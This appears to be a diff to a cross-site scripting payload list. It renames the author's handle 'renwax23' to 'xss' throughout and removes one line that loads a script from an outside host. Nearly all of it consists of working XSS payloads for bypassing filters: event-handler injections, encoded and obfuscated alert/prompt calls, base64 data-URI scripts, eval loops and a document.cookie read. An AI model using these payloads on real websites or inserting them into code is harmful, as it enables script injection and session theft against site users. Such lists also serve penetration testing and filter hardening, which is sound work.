@@ -12,7 +12,7 @@
 
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
 
-<a/onmousemove=alert(1)//>renwax23
+<a/onmousemove=alert(1)//>xss
 
 <object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
 
@@ -32,11 +32,11 @@
 
 <iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;23&rpar;&gt;" />
 
-<button onmousemove="javascript:alert(1)">renwa
+<button onmousemove="javascript:alert(1)">xss
 
 <BoDy%0AOnpaGeshoW=+window.prompt(1)
 
-<a href=[0x0b]renwax23" onfocus=prompt(1) autofocus fragment="
+<a href=[0x0b]xss" onfocus=prompt(1) autofocus fragment="
 
 <isindex type=image src=1 onerror=alert(1)>
 
@@ -54,7 +54,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 \<svg/onload=alert`1`\>
 
-<article xmlns ="urn:img src=x onerror=xss()//" >renwax23
+<article xmlns ="urn:img src=x onerror=xss()//" >xss
 
 i\{\<\/\s\t\y\le\>\<\i\m\g\20\o\ne\r\r\o\r\=\'a\le\r\t\(d\oc\u\me\nt\.c\o\o\kie\)\'\s\rc\=\'eeeeeee\'\20\>{
 
@@ -63,8 +63,6 @@ i\{\<\/\s\t\y\le\>\<\i\m\g\20\o\ne\r\r\o\r\=\'a\le\r\t\(d\oc\u\me\nt\.c\o\o\kie\
 <img/src=q onerror='new Function`al\ert\`OPENBUGBOUNTY\``'>
 
 <Html Onmouseover=(alert)(1) //
-
-<script src=http://renwa.tk/d.js></script>
 
 <a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>
 
@@ -80,17 +78,17 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 
 <embed src=/x//alert(1)><base href="javascript:\
 
-<x+oncut=y=prompt,y`1`>renwax23
+<x+oncut=y=prompt,y`1`>xss
 
 <svG x=">" onload=(co\u006efirm)``>
 
-<script/renwa~~~>;alert(1);</script/X~~~>
+<script/xss~~~>;alert(1);</script/X~~~>
 
 <VideO/**/OnerroR=~alert("1")+/SrC>
 
 <video/poster/onerror=prompt(1)>
 
-<sVG/renwa/OnLoaD+="window['confirm']+(1)">
+<sVG/xss/OnLoaD+="window['confirm']+(1)">
 
 <img x/src=x /onerror="x-\u0063onfirm(1)">
 
@@ -98,9 +96,9 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 
 <video/src=//w3schools.com/tags/movie.mp4%0Aautoplay/onplay=(confirm(1))>
 
-<p/%0Aonmouseover%0A=%0Aconfirm(1)>renwax23
+<p/%0Aonmouseover%0A=%0Aconfirm(1)>xss
 
-<span/onmouseover=confirm(1)>renwax23
+<span/onmouseover=confirm(1)>xss
 
 <iframe/name="javascript:confirm(1);"onload="while(1){eval(name);}">
 
@@ -108,35 +106,35 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 
 <object data='data:text/html;base64,PFNDUklQVD5hbGVydCgnUkVOV0FYMjMnKTs8L1NDUklQVD4=' /src>
 
-<InpuT/**/onfocus=pr\u006fmpt(1)%0Aautofocus>renwa
+<InpuT/**/onfocus=pr\u006fmpt(1)%0Aautofocus>xss
 
 <img src="x:alert" onerror="eval(src%2b'(1)')">
 
-<img/src=renwax23%0A/**/onerror=eval('al'%2b'ert(1)')>
+<img/src=xss%0A/**/onerror=eval('al'%2b'ert(1)')>
 
 <img/alt=1 onerror=eval(src) src=x:alert(alt) >
 
-<isindex/**/alt=1+src=renwa:window['alert']/**/(alt)+type=image+onerror=while(true){eval(src)}>
+<isindex/**/alt=1+src=xss:window['alert']/**/(alt)+type=image+onerror=while(true){eval(src)}>
 
 <input type="text" name="foo" value=""autofocus/onfocus=alert(1)//">
 
 <math href="javascript:alert(1)">CLICKME
 
-<var onmouseover="prompt(1)">renwax23</var>
+<var onmouseover="prompt(1)">xss</var>
 
-<h1/onmouseover='alert(1)'>renwa
+<h1/onmouseover='alert(1)'>xss
 
 <object data="javascript:alert(1)">
 
 <--'<script>window.confirm(1)</script> --!>
 
-<div onmouseover=prompt("1")>renwa
+<div onmouseover=prompt("1")>xss
 
 <img src=x onerror=window.open('data:text/html;base64,PFNDUklQVD5hbGVydCgnUkVOV0FYMjMnKTs8L1NDUklQVD4=');>
 
-<plaintext/onmousemove=prompt(1)>renwa
+<plaintext/onmousemove=prompt(1)>xss
 
-<marquee/onstart=alert(1)>renwa
+<marquee/onstart=alert(1)>xss
 
 <embed src=javascript:alert(1)>
 
@@ -146,7 +144,7 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 
 <keygen autofocus onfocus=alert(1)>
 
-<div/onmouseover='alert(1)'>renwa
+<div/onmouseover='alert(1)'>xss
 
 <svg/onload=document.location.href='https://google.com'>
 
@@ -158,17 +156,17 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 
 <i onclick=alert(1)>Click here</i>
 
-<img src=<b onerror=alert('renwax23');>
+<img src=<b onerror=alert('xss');>
 
 <img src="x:? title=" onerror=alert(1)//">
 
-<img src="x:gif" onerror="eval('al'%2b'ert(/renwax23/)')">
+<img src="x:gif" onerror="eval('al'%2b'ert(/xss/)')">
 
-<img src="x:gif" onerror="window['al\u0065rt'] (/'renwax23'/)"></img> 
+<img src="x:gif" onerror="window['al\u0065rt'] (/'xss'/)"></img> 
 
-<a onmouseover%3D"alert(1)">renwax23
+<a onmouseover%3D"alert(1)">xss
 
-<script/%00%00v%00%00>alert(/renwax23/)</script>
+<script/%00%00v%00%00>alert(/xss/)</script>
 
 <svg/onload=document.location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>
 
@@ -176,7 +174,7 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 
 <svg•onload=alert(1)>
 
-<h1/onmouseover='alert(1)'>Renwa
+<h1/onmouseover='alert(1)'>xss
 
 <video onerror=alert(1337) </poster>
 
